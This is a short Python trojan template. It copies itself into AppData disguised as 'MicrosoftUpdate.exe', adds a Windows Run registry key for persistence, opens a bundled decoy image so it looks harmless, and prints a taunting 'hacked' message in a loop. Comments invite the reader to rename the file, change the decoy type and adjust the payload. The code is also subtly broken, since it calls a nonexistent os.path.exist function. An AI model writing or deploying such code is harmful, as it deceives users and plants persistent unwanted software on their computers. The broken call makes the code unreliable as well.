import sys
import subprocess
import os
import shutil
import time


def add_registery():
		#You can change file place what you want appdata or something and you can rename what you want like MicrosoftUpdate.exe
	file = os.environ["appdata"] + "\\MicrosoftUpdate.exe"
	if not os.path.exist(file):
		shutil.copyfile(sys.executable,file)
		# This part for where trojan want to be in file you can change what you want
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + file
		subprocess.call(regedit_command, shell=True)

add_registery()

def file_edit():
	#You can change file extension what you need like jpk,pdf or others
	added_file = sys._MEIPASS + "\\45.jpg"
	subprocess.Popen(added_file, shell=True)

file_edit()

x = 0
#You can change of amount your packet like 1000 or more or less
while x<1000:
	#You can write what you want
	print("I've already hacked you")
	x += 1
	time.sleep(0.5)
	